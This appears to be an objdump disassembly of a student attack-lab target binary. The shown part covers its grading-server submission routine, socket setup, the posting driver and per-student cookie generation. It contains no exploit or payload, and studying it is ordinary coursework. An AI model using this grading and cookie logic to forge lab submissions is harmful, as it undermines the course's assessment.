  4024c7:	e9 74 04 00 00       	jmpq   402940 <submitr+0x709>
  4024cc:	48 8d b4 24 20 40 00 	lea    0x4020(%rsp),%rsi
  4024d3:	00 
  4024d4:	b9 00 04 00 00       	mov    $0x400,%ecx
  4024d9:	b8 00 00 00 00       	mov    $0x0,%eax
  4024de:	48 89 f7             	mov    %rsi,%rdi
  4024e1:	f3 48 ab             	rep stos %rax,%es:(%rdi)
  4024e4:	4c 89 ef             	mov    %r13,%rdi
  4024e7:	e8 0f fb ff ff       	callq  401ffb <urlencode>
  4024ec:	85 c0                	test   %eax,%eax
  4024ee:	0f 89 8a 00 00 00    	jns    40257e <submitr+0x347>
  4024f4:	48 b8 45 72 72 6f 72 	movabs $0x52203a726f727245,%rax
  4024fb:	3a 20 52 
  4024fe:	48 89 03             	mov    %rax,(%rbx)
  402501:	48 b8 65 73 75 6c 74 	movabs $0x747320746c757365,%rax
  402508:	20 73 74 
  40250b:	48 89 43 08          	mov    %rax,0x8(%rbx)
  40250f:	48 b8 72 69 6e 67 20 	movabs $0x6e6f6320676e6972,%rax
  402516:	63 6f 6e 
  402519:	48 89 43 10          	mov    %rax,0x10(%rbx)
  40251d:	48 b8 74 61 69 6e 73 	movabs $0x6e6120736e696174,%rax
  402524:	20 61 6e 
  402527:	48 89 43 18          	mov    %rax,0x18(%rbx)
  40252b:	48 b8 20 69 6c 6c 65 	movabs $0x6c6167656c6c6920,%rax
  402532:	67 61 6c 
  402535:	48 89 43 20          	mov    %rax,0x20(%rbx)
  402539:	48 b8 20 6f 72 20 75 	movabs $0x72706e7520726f20,%rax
  402540:	6e 70 72 
  402543:	48 89 43 28          	mov    %rax,0x28(%rbx)
  402547:	48 b8 69 6e 74 61 62 	movabs $0x20656c6261746e69,%rax
  40254e:	6c 65 20 
  402551:	48 89 43 30          	mov    %rax,0x30(%rbx)
  402555:	48 b8 63 68 61 72 61 	movabs $0x6574636172616863,%rax
  40255c:	63 74 65 
  40255f:	48 89 43 38          	mov    %rax,0x38(%rbx)
  402563:	66 c7 43 40 72 2e    	movw   $0x2e72,0x40(%rbx)
  402569:	c6 43 42 00          	movb   $0x0,0x42(%rbx)
  40256d:	89 ef                	mov    %ebp,%edi
  40256f:	e8 3c e7 ff ff       	callq  400cb0 <close@plt>
  402574:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402579:	e9 c2 03 00 00       	jmpq   402940 <submitr+0x709>
  40257e:	4d 89 e1             	mov    %r12,%r9
  402581:	4c 8d 84 24 20 40 00 	lea    0x4020(%rsp),%r8
  402588:	00 
  402589:	4c 89 f9             	mov    %r15,%rcx
  40258c:	4c 89 f2             	mov    %r14,%rdx
  40258f:	be 18 34 40 00       	mov    $0x403418,%esi
  402594:	48 8d bc 24 20 60 00 	lea    0x6020(%rsp),%rdi
  40259b:	00 
  40259c:	b8 00 00 00 00       	mov    $0x0,%eax
  4025a1:	e8 3a e8 ff ff       	callq  400de0 <sprintf@plt>
  4025a6:	48 8d bc 24 20 60 00 	lea    0x6020(%rsp),%rdi
  4025ad:	00 
  4025ae:	b8 00 00 00 00       	mov    $0x0,%eax
  4025b3:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
  4025ba:	f2 ae                	repnz scas %es:(%rdi),%al
  4025bc:	48 f7 d1             	not    %rcx
  4025bf:	48 8d 51 ff          	lea    -0x1(%rcx),%rdx
  4025c3:	48 8d b4 24 20 60 00 	lea    0x6020(%rsp),%rsi
  4025ca:	00 
  4025cb:	89 ef                	mov    %ebp,%edi
  4025cd:	e8 ff fa ff ff       	callq  4020d1 <rio_writen>
  4025d2:	48 85 c0             	test   %rax,%rax
  4025d5:	79 6e                	jns    402645 <submitr+0x40e>
  4025d7:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  4025de:	3a 20 43 
  4025e1:	48 89 03             	mov    %rax,(%rbx)
  4025e4:	48 b8 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rax
  4025eb:	20 75 6e 
  4025ee:	48 89 43 08          	mov    %rax,0x8(%rbx)
  4025f2:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  4025f9:	74 6f 20 
  4025fc:	48 89 43 10          	mov    %rax,0x10(%rbx)
  402600:	48 b8 77 72 69 74 65 	movabs $0x6f74206574697277,%rax
  402607:	20 74 6f 
  40260a:	48 89 43 18          	mov    %rax,0x18(%rbx)
  40260e:	48 b8 20 74 68 65 20 	movabs $0x7365722065687420,%rax
  402615:	72 65 73 
  402618:	48 89 43 20          	mov    %rax,0x20(%rbx)
  40261c:	48 b8 75 6c 74 20 73 	movabs $0x7672657320746c75,%rax
  402623:	65 72 76 
  402626:	48 89 43 28          	mov    %rax,0x28(%rbx)
  40262a:	66 c7 43 30 65 72    	movw   $0x7265,0x30(%rbx)
  402630:	c6 43 32 00          	movb   $0x0,0x32(%rbx)
  402634:	89 ef                	mov    %ebp,%edi
  402636:	e8 75 e6 ff ff       	callq  400cb0 <close@plt>
  40263b:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402640:	e9 fb 02 00 00       	jmpq   402940 <submitr+0x709>
  402645:	89 ee                	mov    %ebp,%esi
  402647:	48 8d bc 24 20 80 00 	lea    0x8020(%rsp),%rdi
  40264e:	00 
  40264f:	e8 6c f9 ff ff       	callq  401fc0 <rio_readinitb>
  402654:	ba 00 20 00 00       	mov    $0x2000,%edx
  402659:	48 8d b4 24 20 60 00 	lea    0x6020(%rsp),%rsi
  402660:	00 
  402661:	48 8d bc 24 20 80 00 	lea    0x8020(%rsp),%rdi
  402668:	00 
  402669:	e8 46 fb ff ff       	callq  4021b4 <rio_readlineb>
  40266e:	48 85 c0             	test   %rax,%rax
  402671:	7f 7d                	jg     4026f0 <submitr+0x4b9>
  402673:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  40267a:	3a 20 43 
  40267d:	48 89 03             	mov    %rax,(%rbx)
  402680:	48 b8 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rax
  402687:	20 75 6e 
  40268a:	48 89 43 08          	mov    %rax,0x8(%rbx)
  40268e:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  402695:	74 6f 20 
  402698:	48 89 43 10          	mov    %rax,0x10(%rbx)
  40269c:	48 b8 72 65 61 64 20 	movabs $0x7269662064616572,%rax
  4026a3:	66 69 72 
  4026a6:	48 89 43 18          	mov    %rax,0x18(%rbx)
  4026aa:	48 b8 73 74 20 68 65 	movabs $0x6564616568207473,%rax
  4026b1:	61 64 65 
  4026b4:	48 89 43 20          	mov    %rax,0x20(%rbx)
  4026b8:	48 b8 72 20 66 72 6f 	movabs $0x72206d6f72662072,%rax
  4026bf:	6d 20 72 
  4026c2:	48 89 43 28          	mov    %rax,0x28(%rbx)
  4026c6:	48 b8 65 73 75 6c 74 	movabs $0x657320746c757365,%rax
  4026cd:	20 73 65 
  4026d0:	48 89 43 30          	mov    %rax,0x30(%rbx)
  4026d4:	c7 43 38 72 76 65 72 	movl   $0x72657672,0x38(%rbx)
  4026db:	c6 43 3c 00          	movb   $0x0,0x3c(%rbx)
  4026df:	89 ef                	mov    %ebp,%edi
  4026e1:	e8 ca e5 ff ff       	callq  400cb0 <close@plt>
  4026e6:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4026eb:	e9 50 02 00 00       	jmpq   402940 <submitr+0x709>
  4026f0:	4c 8d 44 24 10       	lea    0x10(%rsp),%r8
  4026f5:	48 8d 8c 24 1c 20 00 	lea    0x201c(%rsp),%rcx
  4026fc:	00 
  4026fd:	48 8d 94 24 20 20 00 	lea    0x2020(%rsp),%rdx
  402704:	00 
  402705:	be 8f 34 40 00       	mov    $0x40348f,%esi
  40270a:	48 8d bc 24 20 60 00 	lea    0x6020(%rsp),%rdi
  402711:	00 
  402712:	b8 00 00 00 00       	mov    $0x0,%eax
  402717:	e8 54 e6 ff ff       	callq  400d70 <__isoc99_sscanf@plt>
  40271c:	e9 98 00 00 00       	jmpq   4027b9 <submitr+0x582>
  402721:	ba 00 20 00 00       	mov    $0x2000,%edx
  402726:	48 8d b4 24 20 60 00 	lea    0x6020(%rsp),%rsi
  40272d:	00 
  40272e:	48 8d bc 24 20 80 00 	lea    0x8020(%rsp),%rdi
  402735:	00 
  402736:	e8 79 fa ff ff       	callq  4021b4 <rio_readlineb>
  40273b:	48 85 c0             	test   %rax,%rax
  40273e:	7f 79                	jg     4027b9 <submitr+0x582>
  402740:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  402747:	3a 20 43 
  40274a:	48 89 03             	mov    %rax,(%rbx)
  40274d:	48 b8 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rax
  402754:	20 75 6e 
  402757:	48 89 43 08          	mov    %rax,0x8(%rbx)
  40275b:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  402762:	74 6f 20 
  402765:	48 89 43 10          	mov    %rax,0x10(%rbx)
  402769:	48 b8 72 65 61 64 20 	movabs $0x6165682064616572,%rax
  402770:	68 65 61 
  402773:	48 89 43 18          	mov    %rax,0x18(%rbx)
  402777:	48 b8 64 65 72 73 20 	movabs $0x6f72662073726564,%rax
  40277e:	66 72 6f 
  402781:	48 89 43 20          	mov    %rax,0x20(%rbx)
  402785:	48 b8 6d 20 74 68 65 	movabs $0x657220656874206d,%rax
  40278c:	20 72 65 
  40278f:	48 89 43 28          	mov    %rax,0x28(%rbx)
  402793:	48 b8 73 75 6c 74 20 	movabs $0x72657320746c7573,%rax
  40279a:	73 65 72 
  40279d:	48 89 43 30          	mov    %rax,0x30(%rbx)
  4027a1:	c7 43 38 76 65 72 00 	movl   $0x726576,0x38(%rbx)
  4027a8:	89 ef                	mov    %ebp,%edi
  4027aa:	e8 01 e5 ff ff       	callq  400cb0 <close@plt>
  4027af:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4027b4:	e9 87 01 00 00       	jmpq   402940 <submitr+0x709>
  4027b9:	0f b6 84 24 20 60 00 	movzbl 0x6020(%rsp),%eax
  4027c0:	00 
  4027c1:	83 e8 0d             	sub    $0xd,%eax
  4027c4:	75 15                	jne    4027db <submitr+0x5a4>
  4027c6:	0f b6 84 24 21 60 00 	movzbl 0x6021(%rsp),%eax
  4027cd:	00 
  4027ce:	83 e8 0a             	sub    $0xa,%eax
  4027d1:	75 08                	jne    4027db <submitr+0x5a4>
  4027d3:	0f b6 84 24 22 60 00 	movzbl 0x6022(%rsp),%eax
  4027da:	00 
  4027db:	85 c0                	test   %eax,%eax
  4027dd:	0f 85 3e ff ff ff    	jne    402721 <submitr+0x4ea>
  4027e3:	ba 00 20 00 00       	mov    $0x2000,%edx
  4027e8:	48 8d b4 24 20 60 00 	lea    0x6020(%rsp),%rsi
  4027ef:	00 
  4027f0:	48 8d bc 24 20 80 00 	lea    0x8020(%rsp),%rdi
  4027f7:	00 
  4027f8:	e8 b7 f9 ff ff       	callq  4021b4 <rio_readlineb>
  4027fd:	48 85 c0             	test   %rax,%rax
  402800:	0f 8f 83 00 00 00    	jg     402889 <submitr+0x652>
  402806:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  40280d:	3a 20 43 
  402810:	48 89 03             	mov    %rax,(%rbx)
  402813:	48 b8 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rax
  40281a:	20 75 6e 
  40281d:	48 89 43 08          	mov    %rax,0x8(%rbx)
  402821:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  402828:	74 6f 20 
  40282b:	48 89 43 10          	mov    %rax,0x10(%rbx)
  40282f:	48 b8 72 65 61 64 20 	movabs $0x6174732064616572,%rax
  402836:	73 74 61 
  402839:	48 89 43 18          	mov    %rax,0x18(%rbx)
  40283d:	48 b8 74 75 73 20 6d 	movabs $0x7373656d20737574,%rax
  402844:	65 73 73 
  402847:	48 89 43 20          	mov    %rax,0x20(%rbx)
  40284b:	48 b8 61 67 65 20 66 	movabs $0x6d6f726620656761,%rax
  402852:	72 6f 6d 
  402855:	48 89 43 28          	mov    %rax,0x28(%rbx)
  402859:	48 b8 20 72 65 73 75 	movabs $0x20746c7573657220,%rax
  402860:	6c 74 20 
  402863:	48 89 43 30          	mov    %rax,0x30(%rbx)
  402867:	c7 43 38 73 65 72 76 	movl   $0x76726573,0x38(%rbx)
  40286e:	66 c7 43 3c 65 72    	movw   $0x7265,0x3c(%rbx)
  402874:	c6 43 3e 00          	movb   $0x0,0x3e(%rbx)
  402878:	89 ef                	mov    %ebp,%edi
  40287a:	e8 31 e4 ff ff       	callq  400cb0 <close@plt>
  40287f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402884:	e9 b7 00 00 00       	jmpq   402940 <submitr+0x709>
  402889:	8b 94 24 1c 20 00 00 	mov    0x201c(%rsp),%edx
  402890:	81 fa c8 00 00 00    	cmp    $0xc8,%edx
  402896:	74 28                	je     4028c0 <submitr+0x689>
  402898:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
  40289d:	be 58 34 40 00       	mov    $0x403458,%esi
  4028a2:	48 89 df             	mov    %rbx,%rdi
  4028a5:	b8 00 00 00 00       	mov    $0x0,%eax
  4028aa:	e8 31 e5 ff ff       	callq  400de0 <sprintf@plt>
  4028af:	89 ef                	mov    %ebp,%edi
  4028b1:	e8 fa e3 ff ff       	callq  400cb0 <close@plt>
  4028b6:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4028bb:	e9 80 00 00 00       	jmpq   402940 <submitr+0x709>
  4028c0:	48 8d b4 24 20 60 00 	lea    0x6020(%rsp),%rsi
  4028c7:	00 
  4028c8:	48 89 df             	mov    %rbx,%rdi
  4028cb:	e8 70 e3 ff ff       	callq  400c40 <strcpy@plt>
  4028d0:	89 ef                	mov    %ebp,%edi
  4028d2:	e8 d9 e3 ff ff       	callq  400cb0 <close@plt>
  4028d7:	0f b6 03             	movzbl (%rbx),%eax
  4028da:	83 e8 4f             	sub    $0x4f,%eax
  4028dd:	75 18                	jne    4028f7 <submitr+0x6c0>
  4028df:	0f b6 53 01          	movzbl 0x1(%rbx),%edx
  4028e3:	83 ea 4b             	sub    $0x4b,%edx
  4028e6:	75 11                	jne    4028f9 <submitr+0x6c2>
  4028e8:	0f b6 53 02          	movzbl 0x2(%rbx),%edx
  4028ec:	83 ea 0a             	sub    $0xa,%edx
  4028ef:	75 08                	jne    4028f9 <submitr+0x6c2>
  4028f1:	0f b6 53 03          	movzbl 0x3(%rbx),%edx
  4028f5:	eb 02                	jmp    4028f9 <submitr+0x6c2>
  4028f7:	89 c2                	mov    %eax,%edx
  4028f9:	85 d2                	test   %edx,%edx
  4028fb:	74 30                	je     40292d <submitr+0x6f6>
  4028fd:	bf a0 34 40 00       	mov    $0x4034a0,%edi
  402902:	b9 05 00 00 00       	mov    $0x5,%ecx
  402907:	48 89 de             	mov    %rbx,%rsi
  40290a:	f3 a6                	repz cmpsb %es:(%rdi),%ds:(%rsi)
  40290c:	0f 97 c1             	seta   %cl
  40290f:	0f 92 c2             	setb   %dl
  402912:	38 d1                	cmp    %dl,%cl
  402914:	74 1e                	je     402934 <submitr+0x6fd>
  402916:	85 c0                	test   %eax,%eax
  402918:	75 0d                	jne    402927 <submitr+0x6f0>
  40291a:	0f b6 43 01          	movzbl 0x1(%rbx),%eax
  40291e:	83 e8 4b             	sub    $0x4b,%eax
  402921:	75 04                	jne    402927 <submitr+0x6f0>
  402923:	0f b6 43 02          	movzbl 0x2(%rbx),%eax
  402927:	85 c0                	test   %eax,%eax
  402929:	75 10                	jne    40293b <submitr+0x704>
  40292b:	eb 13                	jmp    402940 <submitr+0x709>
  40292d:	b8 00 00 00 00       	mov    $0x0,%eax
  402932:	eb 0c                	jmp    402940 <submitr+0x709>
  402934:	b8 00 00 00 00       	mov    $0x0,%eax
  402939:	eb 05                	jmp    402940 <submitr+0x709>
  40293b:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402940:	48 81 c4 48 a0 00 00 	add    $0xa048,%rsp
  402947:	5b                   	pop    %rbx
  402948:	5d                   	pop    %rbp
  402949:	41 5c                	pop    %r12
  40294b:	41 5d                	pop    %r13
  40294d:	41 5e                	pop    %r14
  40294f:	41 5f                	pop    %r15
  402951:	c3                   	retq   

0000000000402952 <init_timeout>:
  402952:	53                   	push   %rbx
  402953:	89 fb                	mov    %edi,%ebx
  402955:	85 ff                	test   %edi,%edi
  402957:	74 1f                	je     402978 <init_timeout+0x26>
  402959:	85 ff                	test   %edi,%edi
  40295b:	79 05                	jns    402962 <init_timeout+0x10>
  40295d:	bb 00 00 00 00       	mov    $0x0,%ebx
  402962:	be d2 1f 40 00       	mov    $0x401fd2,%esi
  402967:	bf 0e 00 00 00       	mov    $0xe,%edi
  40296c:	e8 6f e3 ff ff       	callq  400ce0 <signal@plt>
  402971:	89 df                	mov    %ebx,%edi
  402973:	e8 28 e3 ff ff       	callq  400ca0 <alarm@plt>
  402978:	5b                   	pop    %rbx
  402979:	c3                   	retq   

000000000040297a <init_driver>:
  40297a:	55                   	push   %rbp
  40297b:	53                   	push   %rbx
  40297c:	48 83 ec 18          	sub    $0x18,%rsp
  402980:	48 89 fd             	mov    %rdi,%rbp
  402983:	be 01 00 00 00       	mov    $0x1,%esi
  402988:	bf 0d 00 00 00       	mov    $0xd,%edi
  40298d:	e8 4e e3 ff ff       	callq  400ce0 <signal@plt>
  402992:	be 01 00 00 00       	mov    $0x1,%esi
  402997:	bf 1d 00 00 00       	mov    $0x1d,%edi
  40299c:	e8 3f e3 ff ff       	callq  400ce0 <signal@plt>
  4029a1:	be 01 00 00 00       	mov    $0x1,%esi
  4029a6:	bf 1d 00 00 00       	mov    $0x1d,%edi
  4029ab:	e8 30 e3 ff ff       	callq  400ce0 <signal@plt>
  4029b0:	ba 00 00 00 00       	mov    $0x0,%edx
  4029b5:	be 01 00 00 00       	mov    $0x1,%esi
  4029ba:	bf 02 00 00 00       	mov    $0x2,%edi
  4029bf:	e8 4c e4 ff ff       	callq  400e10 <socket@plt>
  4029c4:	89 c3                	mov    %eax,%ebx
  4029c6:	85 c0                	test   %eax,%eax
  4029c8:	79 4f                	jns    402a19 <init_driver+0x9f>
  4029ca:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  4029d1:	3a 20 43 
  4029d4:	48 89 45 00          	mov    %rax,0x0(%rbp)
  4029d8:	48 b8 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rax
  4029df:	20 75 6e 
  4029e2:	48 89 45 08          	mov    %rax,0x8(%rbp)
  4029e6:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  4029ed:	74 6f 20 
  4029f0:	48 89 45 10          	mov    %rax,0x10(%rbp)
  4029f4:	48 b8 63 72 65 61 74 	movabs $0x7320657461657263,%rax
  4029fb:	65 20 73 
  4029fe:	48 89 45 18          	mov    %rax,0x18(%rbp)
  402a02:	c7 45 20 6f 63 6b 65 	movl   $0x656b636f,0x20(%rbp)
  402a09:	66 c7 45 24 74 00    	movw   $0x74,0x24(%rbp)
  402a0f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402a14:	e9 23 01 00 00       	jmpq   402b3c <init_driver+0x1c2>
  402a19:	bf ad 2f 40 00       	mov    $0x402fad,%edi
  402a1e:	e8 cd e2 ff ff       	callq  400cf0 <gethostbyname@plt>
  402a23:	48 85 c0             	test   %rax,%rax
  402a26:	75 68                	jne    402a90 <init_driver+0x116>
  402a28:	48 b8 45 72 72 6f 72 	movabs $0x44203a726f727245,%rax
  402a2f:	3a 20 44 
  402a32:	48 89 45 00          	mov    %rax,0x0(%rbp)
  402a36:	48 b8 4e 53 20 69 73 	movabs $0x6e7520736920534e,%rax
  402a3d:	20 75 6e 
  402a40:	48 89 45 08          	mov    %rax,0x8(%rbp)
  402a44:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  402a4b:	74 6f 20 
  402a4e:	48 89 45 10          	mov    %rax,0x10(%rbp)
  402a52:	48 b8 72 65 73 6f 6c 	movabs $0x2065766c6f736572,%rax
  402a59:	76 65 20 
  402a5c:	48 89 45 18          	mov    %rax,0x18(%rbp)
  402a60:	48 b8 73 65 72 76 65 	movabs $0x6120726576726573,%rax
  402a67:	72 20 61 
  402a6a:	48 89 45 20          	mov    %rax,0x20(%rbp)
  402a6e:	c7 45 28 64 64 72 65 	movl   $0x65726464,0x28(%rbp)
  402a75:	66 c7 45 2c 73 73    	movw   $0x7373,0x2c(%rbp)
  402a7b:	c6 45 2e 00          	movb   $0x0,0x2e(%rbp)
  402a7f:	89 df                	mov    %ebx,%edi
  402a81:	e8 2a e2 ff ff       	callq  400cb0 <close@plt>
  402a86:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402a8b:	e9 ac 00 00 00       	jmpq   402b3c <init_driver+0x1c2>
  402a90:	48 c7 04 24 00 00 00 	movq   $0x0,(%rsp)
  402a97:	00 
  402a98:	48 c7 44 24 08 00 00 	movq   $0x0,0x8(%rsp)
  402a9f:	00 00 
  402aa1:	66 c7 04 24 02 00    	movw   $0x2,(%rsp)
  402aa7:	48 8b 48 18          	mov    0x18(%rax),%rcx
  402aab:	48 63 50 14          	movslq 0x14(%rax),%rdx
  402aaf:	48 8d 74 24 04       	lea    0x4(%rsp),%rsi
  402ab4:	48 8b 39             	mov    (%rcx),%rdi
  402ab7:	e8 d4 e2 ff ff       	callq  400d90 <bcopy@plt>
  402abc:	66 c7 44 24 02 47 26 	movw   $0x2647,0x2(%rsp)
  402ac3:	ba 10 00 00 00       	mov    $0x10,%edx
  402ac8:	48 89 e6             	mov    %rsp,%rsi
  402acb:	89 df                	mov    %ebx,%edi
  402acd:	e8 2e e3 ff ff       	callq  400e00 <connect@plt>
  402ad2:	85 c0                	test   %eax,%eax
  402ad4:	79 50                	jns    402b26 <init_driver+0x1ac>
  402ad6:	48 b8 45 72 72 6f 72 	movabs $0x55203a726f727245,%rax
  402add:	3a 20 55 
  402ae0:	48 89 45 00          	mov    %rax,0x0(%rbp)
  402ae4:	48 b8 6e 61 62 6c 65 	movabs $0x6f7420656c62616e,%rax
  402aeb:	20 74 6f 
  402aee:	48 89 45 08          	mov    %rax,0x8(%rbp)
  402af2:	48 b8 20 63 6f 6e 6e 	movabs $0x7463656e6e6f6320,%rax
  402af9:	65 63 74 
  402afc:	48 89 45 10          	mov    %rax,0x10(%rbp)
  402b00:	48 b8 20 74 6f 20 73 	movabs $0x76726573206f7420,%rax
  402b07:	65 72 76 
  402b0a:	48 89 45 18          	mov    %rax,0x18(%rbp)
  402b0e:	66 c7 45 20 65 72    	movw   $0x7265,0x20(%rbp)
  402b14:	c6 45 22 00          	movb   $0x0,0x22(%rbp)
  402b18:	89 df                	mov    %ebx,%edi
  402b1a:	e8 91 e1 ff ff       	callq  400cb0 <close@plt>
  402b1f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402b24:	eb 16                	jmp    402b3c <init_driver+0x1c2>
  402b26:	89 df                	mov    %ebx,%edi
  402b28:	e8 83 e1 ff ff       	callq  400cb0 <close@plt>
  402b2d:	66 c7 45 00 4f 4b    	movw   $0x4b4f,0x0(%rbp)
  402b33:	c6 45 02 00          	movb   $0x0,0x2(%rbp)
  402b37:	b8 00 00 00 00       	mov    $0x0,%eax
  402b3c:	48 83 c4 18          	add    $0x18,%rsp
  402b40:	5b                   	pop    %rbx
  402b41:	5d                   	pop    %rbp
  402b42:	c3                   	retq   

0000000000402b43 <driver_post>:
  402b43:	53                   	push   %rbx
  402b44:	48 83 ec 10          	sub    $0x10,%rsp
  402b48:	4c 89 cb             	mov    %r9,%rbx
  402b4b:	45 85 c0             	test   %r8d,%r8d
  402b4e:	74 22                	je     402b72 <driver_post+0x2f>
  402b50:	48 89 ce             	mov    %rcx,%rsi
  402b53:	bf a5 34 40 00       	mov    $0x4034a5,%edi
  402b58:	b8 00 00 00 00       	mov    $0x0,%eax
  402b5d:	e8 1e e1 ff ff       	callq  400c80 <printf@plt>
  402b62:	66 c7 03 4f 4b       	movw   $0x4b4f,(%rbx)
  402b67:	c6 43 02 00          	movb   $0x0,0x2(%rbx)
  402b6b:	b8 00 00 00 00       	mov    $0x0,%eax
  402b70:	eb 39                	jmp    402bab <driver_post+0x68>
  402b72:	48 85 ff             	test   %rdi,%rdi
  402b75:	74 26                	je     402b9d <driver_post+0x5a>
  402b77:	80 3f 00             	cmpb   $0x0,(%rdi)
  402b7a:	74 21                	je     402b9d <driver_post+0x5a>
  402b7c:	4c 89 0c 24          	mov    %r9,(%rsp)
  402b80:	49 89 c9             	mov    %rcx,%r9
  402b83:	49 89 d0             	mov    %rdx,%r8
  402b86:	48 89 f9             	mov    %rdi,%rcx
  402b89:	48 89 f2             	mov    %rsi,%rdx
  402b8c:	be 26 47 00 00       	mov    $0x4726,%esi
  402b91:	bf ad 2f 40 00       	mov    $0x402fad,%edi
  402b96:	e8 9c f6 ff ff       	callq  402237 <submitr>
  402b9b:	eb 0e                	jmp    402bab <driver_post+0x68>
  402b9d:	66 c7 03 4f 4b       	movw   $0x4b4f,(%rbx)
  402ba2:	c6 43 02 00          	movb   $0x0,0x2(%rbx)
  402ba6:	b8 00 00 00 00       	mov    $0x0,%eax
  402bab:	48 83 c4 10          	add    $0x10,%rsp
  402baf:	5b                   	pop    %rbx
  402bb0:	c3                   	retq   

0000000000402bb1 <check>:
  402bb1:	89 f8                	mov    %edi,%eax
  402bb3:	c1 e8 1c             	shr    $0x1c,%eax
  402bb6:	85 c0                	test   %eax,%eax
  402bb8:	74 1d                	je     402bd7 <check+0x26>
  402bba:	b9 00 00 00 00       	mov    $0x0,%ecx
  402bbf:	eb 0b                	jmp    402bcc <check+0x1b>
  402bc1:	89 f8                	mov    %edi,%eax
  402bc3:	d3 e8                	shr    %cl,%eax
  402bc5:	3c 0a                	cmp    $0xa,%al
  402bc7:	74 14                	je     402bdd <check+0x2c>
  402bc9:	83 c1 08             	add    $0x8,%ecx
  402bcc:	83 f9 1f             	cmp    $0x1f,%ecx
  402bcf:	7e f0                	jle    402bc1 <check+0x10>
  402bd1:	b8 01 00 00 00       	mov    $0x1,%eax
  402bd6:	c3                   	retq   
  402bd7:	b8 00 00 00 00       	mov    $0x0,%eax
  402bdc:	c3                   	retq   
  402bdd:	b8 00 00 00 00       	mov    $0x0,%eax
  402be2:	c3                   	retq   

0000000000402be3 <gencookie>:
  402be3:	53                   	push   %rbx
  402be4:	83 c7 01             	add    $0x1,%edi
  402be7:	e8 34 e0 ff ff       	callq  400c20 <srandom@plt>
  402bec:	e8 5f e1 ff ff       	callq  400d50 <random@plt>
  402bf1:	89 c3                	mov    %eax,%ebx
  402bf3:	89 c7                	mov    %eax,%edi
  402bf5:	e8 b7 ff ff ff       	callq  402bb1 <check>
  402bfa:	85 c0                	test   %eax,%eax
  402bfc:	74 ee                	je     402bec <gencookie+0x9>
  402bfe:	89 d8                	mov    %ebx,%eax
  402c00:	5b                   	pop    %rbx
  402c01:	c3                   	retq   
  402c02:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  402c09:	00 00 00 
  402c0c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000402c10 <__libc_csu_init>:
  402c10:	41 57                	push   %r15
  402c12:	41 89 ff             	mov    %edi,%r15d
  402c15:	41 56                	push   %r14
  402c17:	49 89 f6             	mov    %rsi,%r14
  402c1a:	41 55                	push   %r13
  402c1c:	49 89 d5             	mov    %rdx,%r13
  402c1f:	41 54                	push   %r12
  402c21:	4c 8d 25 e8 11 20 00 	lea    0x2011e8(%rip),%r12        # 603e10 <__frame_dummy_init_array_entry>
  402c28:	55                   	push   %rbp
  402c29:	48 8d 2d e8 11 20 00 	lea    0x2011e8(%rip),%rbp        # 603e18 <__init_array_end>
  402c30:	53                   	push   %rbx
  402c31:	4c 29 e5             	sub    %r12,%rbp
  402c34:	31 db                	xor    %ebx,%ebx
  402c36:	48 c1 fd 03          	sar    $0x3,%rbp
  402c3a:	48 83 ec 08          	sub    $0x8,%rsp
  402c3e:	e8 85 df ff ff       	callq  400bc8 <_init>
  402c43:	48 85 ed             	test   %rbp,%rbp
  402c46:	74 1e                	je     402c66 <__libc_csu_init+0x56>
  402c48:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  402c4f:	00 
  402c50:	4c 89 ea             	mov    %r13,%rdx
  402c53:	4c 89 f6             	mov    %r14,%rsi
  402c56:	44 89 ff             	mov    %r15d,%edi
  402c59:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
  402c5d:	48 83 c3 01          	add    $0x1,%rbx
  402c61:	48 39 eb             	cmp    %rbp,%rbx
  402c64:	75 ea                	jne    402c50 <__libc_csu_init+0x40>
  402c66:	48 83 c4 08          	add    $0x8,%rsp
  402c6a:	5b                   	pop    %rbx
  402c6b:	5d                   	pop    %rbp
  402c6c:	41 5c                	pop    %r12
  402c6e:	41 5d                	pop    %r13
  402c70:	41 5e                	pop    %r14
  402c72:	41 5f                	pop    %r15
  402c74:	c3                   	retq   
  402c75:	90                   	nop
  402c76:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  402c7d:	00 00 00 

0000000000402c80 <__libc_csu_fini>:
  402c80:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000402c84 <_fini>:
  402c84:	48 83 ec 08          	sub    $0x8,%rsp
  402c88:	48 83 c4 08          	add    $0x8,%rsp
  402c8c:	c3                   	retq   
[huimin@lnxsrv09 ~/target17]$ 
